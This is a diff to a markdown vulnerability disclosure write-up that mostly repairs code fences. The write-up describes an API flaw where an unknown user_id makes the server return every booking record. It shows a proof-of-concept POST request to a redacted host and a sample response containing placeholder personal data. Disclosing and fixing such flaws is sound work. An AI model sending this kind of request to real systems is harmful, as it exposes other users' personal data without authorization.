@@ -25,7 +25,7 @@ The vulnerability occurs when a user provides an ID that does not exist in the a
 The vulnerability was triggered via the following request structure. Notice that the `user_id` provided does not match the session token.
 
 **Request:**
-'''http
+```http
 POST /api/v1/view-records HTTP/1.1
 Host: redacted-app.com
 Authorization: Bearer [Valid_Session_Token]
@@ -34,17 +34,19 @@ Content-Type: application/json
 {
   "user_id": "GHOST_ID_99921", 
   "filter": "all"
-}'''
+}
 
 
 ### The "Fail-Open" Response:
 The server responded with a 200 OK containing a JSON array of every booking record in the system.
 
-'''[
+```[
   { "id": 1, "name": "Admin", "email": "admin@target.com", "booking_ref": "ABC-123" },
   { "id": 2, "name": "Victim_User", "email": "victim@email.com", "booking_ref": "XYZ-789" },
   "// ... 50,000+ more entries"
 ]'''
+
+---
 
 🛡️ Remediation & Mitigation
 To address this, I provided the following actionable guidance:
